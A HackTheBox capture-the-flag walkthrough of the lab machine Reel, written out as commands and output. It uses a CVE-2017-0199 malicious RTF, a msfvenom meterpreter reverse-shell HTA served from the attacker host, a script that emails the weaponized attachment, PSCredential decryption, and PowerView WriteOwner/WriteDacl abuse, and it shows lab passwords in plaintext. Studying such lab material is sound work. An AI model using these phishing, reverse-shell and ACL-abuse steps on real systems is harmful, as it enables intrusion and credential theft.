---
tags:
  - CVE-2017-0199
  - ad_writeowner
  - ad_writedacl
group: ActiveDirectory
---
![](https://labs.hackthebox.com/storage/avatars/55d0de0cfa8b70e916abbb3f513dc1a7.png)

- Machine : https://app.hackthebox.com/machines/Reel
- Reference : https://0xdf.gitlab.io/2018/11/10/htb-reel.html
- Solved : 2024.12.29. (Sun) (Takes 2days)

## Summary
---

1. **Initial Enumeration**
    - **Port Scanning**: Discovered key open ports on the target, including FTP (21), SSH (22), SMTP (25), and SMB (139/445).
    - **FTP Enumeration**: Logged in with anonymous access and downloaded files revealing AppLocker rules and potential use of RTF files.
    - **SMTP Testing**: Verified the validity of the email `nico@megabank.com`.
    
2. **Exploitation**
    - **CVE-2017-0199 (RTF Exploit)**:
        - Crafted a malicious RTF file containing a reverse shell payload.
        - Sent the RTF file to `nico@megabank.com` via SMTP.
        - Triggered the payload, gaining a reverse shell as the `nico` user.
        
3. **Privilege Escalation to `tom`**
    - Found a `cred.xml` file on `nico`'s desktop.
    - Decrypted the PSCredential using PowerShell to retrieve `tom`'s credentials.
    - Used the credentials to log in via SSH as `tom`.
    
4. **Privilege Escalation to `claire`**
    - Identified `WriteOwner` permissions for `tom` on `claire`'s ACL using BloodHound analysis.
    - Changed `claire`'s owner to `tom` and granted `ResetPassword` rights.
    - Reset `claire`'s password and logged in via SSH.
    
5. **Privilege Escalation to `Administrator`**
    - Found `WriteDacl` permissions for `claire` on the `Backup_Admins` group.
    - Added `claire` to the `Backup_Admins` group.
    - Discovered `Administrator` credentials in a backup script file within the `Backup Scripts` directory.
    - Used the credentials to log in as `Administrator`.

### Key Techniques:

- **Exploitation**: Leveraged CVE-2017-0199 to gain initial access.
- **Credential Dumping**: Extracted credentials using `cred.xml` and PowerShell.
- **Active Directory Abuse**: Utilized `WriteOwner` and `WriteDacl` permissions for privilege escalation.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ./port-scan.sh 10.10.10.77
Performing quick port scan on 10.10.10.77...
Found open ports: 21,22,25,135,139,445,49159
Performing detailed scan on 10.10.10.77...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-28 15:46 EST
Nmap scan report for 10.10.10.77
Host is up (2.1s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
49159/tcp open  msrpc        Microsoft Windows RPC
<SNIP>
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.71 seconds
```

- Windows is running.
- ftp(21), ssh(22), smtp(25) are running.
- AD service ports are running : rpc(135, 49159), smb(139, 445)

### ftp(21)

Let's see if it allows anonymous login.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ftp anonymous@10.10.10.77
Connected to 10.10.10.77.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41016|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41017|)
125 Data connection already open; Transfer starting.
05-28-18  11:19PM                 2047 AppLocker.docx
05-28-18  01:01PM                  124 readme.txt
10-31-17  09:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```

There are 3 files downloadable. Let's download them all.

```bash
ftp> binary
200 Type set to I.

ftp> get AppLocker.docx
local: AppLocker.docx remote: AppLocker.docx
229 Entering Extended Passive Mode (|||41025|)
125 Data connection already open; Transfer starting.
100% |********************************|  2047        2.78 KiB/s    00:00 ETA
226 Transfer complete.
2047 bytes received in 00:00 (2.78 KiB/s)

ftp> get readme.txt
local: readme.txt remote: readme.txt
229 Entering Extended Passive Mode (|||41026|)
125 Data connection already open; Transfer starting.
100% |********************************|   124        0.23 KiB/s    00:00 ETA
226 Transfer complete.
124 bytes received in 00:00 (0.23 KiB/s)

ftp> get "Windows Event Forwarding.docx"
local: Windows Event Forwarding.docx remote: Windows Event Forwarding.docx
229 Entering Extended Passive Mode (|||41027|)
125 Data connection already open; Transfer starting.
100% |********************************| 14581        8.16 KiB/s    00:00 ETA
226 Transfer complete.
14581 bytes received in 00:01 (8.16 KiB/s)

ftp> exit
221 Goodbye.
```

With online viewer, I read the files.

AppLocker.docx : 
```text
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

It's talking about AppLocker which is applied to `ps1, vbs, cmd, bat, js` files.

readme.txt : 
```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ cat readme.txt    
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

It implies that they will do something if we send `rtf` format file through email.

Windows Event Forwarding.docs :
```text
# get winrm config
winrm get winrm/config
# gpo config
O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)// add to GPO
Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60// add to GPO (60 seconds)
on source computer: gpupdate /force
# prereqs
start Windows Remote Management service on source computer
add builtin\network service account to "Event Log Readers" group on collector server
# list subscriptions / export
C:\Windows\system32>wecutil es > subs.txt
# check subscription status
C:\Windows\system32>wecutil gr "Account Currently Disabled"
Subscription: Account Currently Disabled        
RunTimeStatus: Active        
LastError: 0        
EventSources:                
LAPTOP12.HTB.LOCAL                        
RunTimeStatus: Active                        
LastError: 0                        
LastHeartbeatTime: 2017-07-11T13:27:00.920
# change pre-rendering setting in multiple subscriptions
for /F "tokens=*" %i in (subs.txt) DO wecutil ss "%i" /cf:Events# export subscriptions to xml
for /F "tokens=*" %i in (subs.txt) DO 
wecutil gs "%i" /f:xml >> "%i.xml"
# import subscriptions from xmlwecutil cs "Event Log Service Shutdown.xml
"wecutil cs "Event Log was cleared.xml"
```

It looks like a log file... Just roughly analyzing..
- In case of an issue, set the subscription format to "Events" (using `wecutil ss`).  
- Change the regional settings to "English (United States)".  
- Check the subscription status on the source computer through the `Eventlog-ForwardingPlugin` logs.  
- Verify the runtime status on the collector server and run `gpupdate /force` if necessary.  
- Review error logs to determine and apply additional actions.

Quite much information is here, but not really interesting..
`exiftool` can be useful to analyze further.

AppLocker.docx : 
```bash
┌──(kali㉿kali)-[~/htb/ftp]
└─$ exiftool AppLocker/AppLocker.docx 
ExifTool Version Number         : 12.76
File Name                       : AppLocker.docx
Directory                       : AppLocker
File Size                       : 2.0 kB
File Modification Date/Time     : 2018:05:28 19:19:48-04:00
File Access Date/Time           : 2024:12:28 17:03:11-05:00
File Inode Change Date/Time     : 2024:12:28 17:02:39-05:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0008
Zip Compression                 : Deflated
Zip Modify Date                 : 2018:05:29 00:19:50
Zip CRC                         : 0x3cdd8b4f
Zip Compressed Size             : 166
Zip Uncompressed Size           : 284
Zip File Name                   : _rels/.rels
```

This file is not that useful.

Windows Event Forwarding.docs :
```yaml
┌──(kali㉿kali)-[~/htb/ftp]
└─$ exiftool WEF/WindowsEventForwarding.docx 
ExifTool Version Number         : 12.76
File Name                       : WindowsEventForwarding.docx
Directory                       : WEF
File Size                       : 15 kB
File Modification Date/Time     : 2017:10:31 17:13:23-04:00
File Access Date/Time           : 2024:12:28 17:03:37-05:00
File Inode Change Date/Time     : 2024:12:28 17:03:07-05:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : 
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```

It contains creator information : `nico@megabank.com`
This could be a potential email address.

### smtp(25)

Let's test if the found email address(`nico@megabank.com`) is valid.

```sql
┌──(kali㉿kali)-[~/htb]
└─$ telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO x
250 Hello.
MAIL FROM:bokchee@paeeri.com
250 OK
RCPT TO:nico@megabank.com
250 OK
RCPT TO:unknown 
550 A valid address is required.
```



# Shell as `nico`

Let's summarize all what I've got.
- If I send a mail then, RTF file will be processed.
- One of the `docx` file identifies that there's a user `nico` whose email address is `nico@megabank.com`

Since the machine has been released in 2018.
I searched if there's any vulnerabilities regarding "RTF" before 2018,
and I found the following :
https://www.exploit-db.com/exploits/41894

CVE-2017-0199 is a RCE vulnerability of Microsoft Office, which attackers can run malicious code from specially modified document files. This vulnerability includes OLE object in RTF file, which causes file download and execution from remote server. Through this method, attacker can control the victim's PC.

Create a malicious RTF file :
```bash
┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ python2 cve-2017-0199_toolkit.py -M gen -t RTF -w malicious.rtf -u http://10.10.14.4:8080/shell.hta
Generating normal RTF payload.

Generated malicious.rtf successfully
```

Create an `hta` file for the later exeuction :
```bash
┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=9000 -f hta-psh > shell.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of hta-psh file: 7968 bytes
```

Wait for the file download :
```bash
┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ python -m http.server 8080                                                                         
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.77 - - [29/Dec/2024 02:21:20] "GET /shell.hta HTTP/1.1" 200 -
```

Python code to automate sending mail with malicious attachment :
```python
┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ cat send_mail.py 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# SMTP server information
smtp_server = "10.10.10.77"
smtp_port = 25

# Sender and recipient email
from_email = "attacker@example.com"
to_email = "nico@megabank.com"

# Create email message
msg = MIMEMultipart()
msg['From'] = from_email
msg['To'] = to_email
msg['Subject'] = "Requested Document"

# Email body
body = "Hi Nico,\n\nAs requested, please find the RTF document attached.\n\nRegards,\nAttacker"
msg.attach(MIMEText(body, 'plain'))

# Attach RTF file
filename = "malicious.rtf"
with open(filename, "rb") as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f'attachment; filename={filename}')
msg.attach(part)

# Connect to SMTP server and send email
try:
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.sendmail(from_email, to_email, msg.as_string())
    print("Email sent successfully!")
    server.quit()
except Exception as e:
    print(f"Error sending email: {e}")


┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ python send_mail.py
Email sent successfully!
```

Metasploit Listener :
```bash
┌──(kali㉿kali)-[~/htb/CVE-2017-0199]
└─$ msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(multi/handler) > set LPORT 9000
LPORT => 9000
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.4:9000 
[*] Sending stage (201798 bytes) to 10.10.10.77
[*] Meterpreter session 1 opened (10.10.14.4:9000 -> 10.10.10.77:59447) at 2024-12-29 02:21:26 -0500

meterpreter > getuid
Server username: HTB\nico
```

I got a `nico`'s shell!



# Shell as `tom`

### Enumeration

On `nico`'s Desktop, there's another file besides flag.

```bash
C:\Users\nico\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CEBA-B613

 Directory of C:\Users\nico\Desktop

28/05/2018  20:07    <DIR>          .
28/05/2018  20:07    <DIR>          ..
27/10/2017  23:59             1,468 cred.xml
27/12/2024  19:27                34 user.txt
               2 File(s)          1,502 bytes
               2 Dir(s)   4,877,672,448 bytes free
```

Given the file name `cred`, it's expected to have some critical information.

```xml
C:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

There's another user `tom` whose credential is saved in this file.

### Crack PSCredential

Since this credential is encrypted as PSCredential, I can decrypt it through Powershell.

```bash
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

The cracked password is `1ts-mag1c!!!`
Since ssh(22) service is running, let's try getting a shell as `tom`.

```vbnet
┌──(kali㉿kali)-[~/htb]
└─$ ssh tom@10.10.10.77
The authenticity of host '10.10.10.77 (10.10.10.77)' can't be established.
ED25519 key fingerprint is SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.77' (ED25519) to the list of known hosts.
tom@10.10.10.77's password: 
Microsoft Windows [Version 6.3.9600]                                         
(c) 2013 Microsoft Corporation. All rights reserved.                         

tom@REEL C:\Users\tom>
```

I got a `tom`'s shell!



# Shell as `Claire`

### Enumeration

On `tom`'s Desktop, I was able to find some interesting files.

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit>dir                                   
 Volume in drive C has no label.                                             
 Volume Serial Number is CEBA-B613                                           

 Directory of C:\Users\tom\Desktop\AD Audit                                  

05/29/2018  08:02 PM    <DIR>          .                                     
05/29/2018  08:02 PM    <DIR>          ..                                    
05/29/2018  11:44 PM    <DIR>          BloodHound                            
05/29/2018  08:02 PM               182 note.txt                              
               1 File(s)            182 bytes                                
               3 Dir(s)   4,877,148,160 bytes free                           

tom@REEL C:\Users\tom\Desktop\AD Audit>cat note.txt                          
'cat' is not recognized as an internal or external command,                  
operable program or batch file.                                              

tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt                         
Findings:                                                                    

Surprisingly no AD attack paths from user to Domain Admin (using default shor
test path query).                                                            

Maybe we should re-run Cypher query against other groups we've created.  
```

It looks like I have to work on Active Directory.

```bash
tom@REEL C:\Users\tom\Desktop>.\SharpHound.exe -c All                        
This program is blocked by group policy. For more information, contact your s
ystem administrator. 
```

However, the code execution is blocked for some reason.
Instead, there's a pre-run result.

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir              
 Volume in drive C has no label.                                             
 Volume Serial Number is CEBA-B613                                           

 Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors             

12/29/2024  08:32 AM    <DIR>          .                                     
12/29/2024  08:32 AM    <DIR>          ..                                    
11/16/2017  11:50 PM           112,225 acls.csv                              
10/28/2017  08:50 PM             3,549 BloodHound.bin                        
10/24/2017  03:27 PM           246,489 BloodHound_Old.ps1
10/24/2017  03:27 PM           568,832 SharpHound.exe                        
10/24/2017  03:27 PM           636,959 SharpHound.ps1                        
               6 File(s)      1,575,222 bytes                                
               2 Dir(s)   4,875,026,432 bytes free      
```

It's not easy to download these files, so I just copied contents from `acls.csv`.
And opened it with online viewer.

### Analyze AD ACLs

First, let's focus on `tom`'s policy.

![](attachments/reel_1.png)

`tom` has `WriteOwner` permission on `Claire`.
Since this is the only outbound control from `tom`, I think the next step should be the privesc to `claire`.

![](attachments/reel_2.png)

Then, the user `claire` has `WriteDacl` permission on `Backup_Admins`.

### Exploit `WriteOwner`

First, let's import `PowerView.ps1`

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> dir                             


    Directory: C:\Users\tom\Desktop\AD Audit\BloodHound                      


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
d----        12/29/2024   8:32 AM            Ingestors                       
-a---        10/30/2017  10:15 PM     769587 PowerView.ps1 
```

Next, I’ll set tom as the owner of claire’s ACL:

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity 
claire -OwnerIdentity tom
```

Next, I’ll give tom permissions to change passwords on that ACL:

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdent
ity claire -PrincipalIdentity tom -Rights ResetPassword 
```

Now, I’ll create a credential, and then set claire’s password:

```powershell
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "
qwer1234QWER!@#$" -AsPlainText -force         

PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity
 claire -accountpassword $cred 
```

Now I can use that password to ssh in as claire:

```kotlin
┌──(kali㉿kali)-[~/htb]
└─$ ssh claire@10.10.10.77                       
claire@10.10.10.77's password:

Microsoft Windows [Version 6.3.9600]                                         
(c) 2013 Microsoft Corporation. All rights reserved.                         

claire@REEL C:\Users\claire>
```

I got `claire`'s shell!



# Privesc to `Backup Admins`

From the analysis before, I know that claire has WriteDacl rights on the Backup_Admins group. I can use that to add her to the group. First, see that the only member of the group is ranj:

```powershell
claire@REEL C:\Users\claire>net group backup_admins                          
Group name     Backup_Admins                                                 
Comment                                                                      

Members                                                                      

-----------------------------------------------------------------------------
--                                                                           
ranj                                                                         
The command completed successfully.  
```

Now add claire:

```powershell
claire@REEL C:\Users\claire>net group backup_admins claire /add              
The command completed successfully.                                          


claire@REEL C:\Users\claire>net group backup_admins                          
Group name     Backup_Admins                                                 
Comment                                                                      

Members                                                                      

-----------------------------------------------------------------------------
--                                                                           
claire                   ranj                                                
The command completed successfully.   
```

Despite the fact that it shows claire now in the group, I had to log out and back in to get it to take effect.




# Shell as `Administrator`

### Enumeration

Administrator folder ACL :
```powershell
claire@REEL C:\Users>icacls Administrator                                   
Administrator NT AUTHORITY\SYSTEM:(OI)(CI)(F)                               
              HTB\Backup_Admins:(OI)(CI)(F)                                 
              HTB\Administrator:(OI)(CI)(F)                                 
              BUILTIN\Administrators:(OI)(CI)(F)  
```

Cannot read `root.txt` file though :
```powershell
claire@REEL C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is CC8A-33E1

 Directory of C:\Users\Administrator\Desktop

01/21/2018  02:56 PM    <DIR>          .
01/21/2018  02:56 PM    <DIR>          ..
11/02/2017  09:47 PM    <DIR>          Backup Scripts
10/28/2017  11:56 AM                32 root.txt
               1 File(s)             32 bytes
               3 Dir(s)  15,725,092,864 bytes free

claire@REEL C:\Users\Administrator\Desktop>type root.txt
Access is denied.
claire@REEL C:\Users\Administrator\Desktop>icacls root.txt
root.txt: Access is denied.
```

Let's investigate `Backup Scripts` directory first.

```powershell
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir               
 Volume in drive C has no label.                                            
 Volume Serial Number is CEBA-B613                                          

 Directory of C:\Users\Administrator\Desktop\Backup Scripts                 

11/02/2017  09:47 PM    <DIR>          .                                    
11/02/2017  09:47 PM    <DIR>          ..                                   
11/03/2017  11:22 PM               845 backup.ps1                           
11/02/2017  09:37 PM               462 backup1.ps1                          
11/03/2017  11:21 PM             5,642 BackupScript.ps1                     
11/02/2017  09:43 PM             2,791 BackupScript.zip                     
11/03/2017  11:22 PM             1,855 folders-system-state.txt             
11/03/2017  11:22 PM               308 test2.ps1.txt                        
               6 File(s)         11,903 bytes                               
               2 Dir(s)   4,968,923,136 bytes free   
```

I tried to read all existing files in the directory.
One of the file contains credentials.

BackupScript.ps1 :
```bash
claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>type BackupScript.
ps1                                                                         
# admin password                                                            
$password="Cr4ckMeIfYouC4n!"                                                

#Variables, only Change here                                                
$Destination="\\BACKUP03\BACKUP" #Copy the Files to this Location           
$Versions="50" #How many of the last Backups you want to keep               
$BackupDirs="C:\Program Files\Microsoft\Exchange Server" #What Folders you w
ant to backup                                                               
$Log="Log.txt" #Log Name                                                    
$LoggingLevel="1" #LoggingLevel only for Output in Powershell Window, 1=smar
t, 3=Heavy                                                                  

#STOP-no changes from here                                                  
#STOP-no changes from here                                                  
#Settings - do not change anything from here                                
$Backupdir=$Destination +"\Backup-"+ (Get-Date -format yyyy-MM-dd)+"-"+(Get-
Random -Maximum 100000)+"\"                                                 
$Items=0                                                                    
$Count=0                                                                    
$ErrorCount=0                                                               
$StartDate=Get-Date #-format dd.MM.yyyy-HH:mm:ss                            

<SNIP>
```

Here I can find `administrator`'s password : `Cr4ckMeIfYouC4n!`

Try ssh with the found credential.

```bash
┌──(kali㉿kali)-[~/htb]
└─$ ssh administrator@10.10.10.77
administrator@10.10.10.77's password: 
Microsoft Windows [Version 6.3.9600]                                         
(c) 2013 Microsoft Corporation. All rights reserved.                         

administrator@REEL C:\Users\Administrator>
```

I got `administrator`'s shell!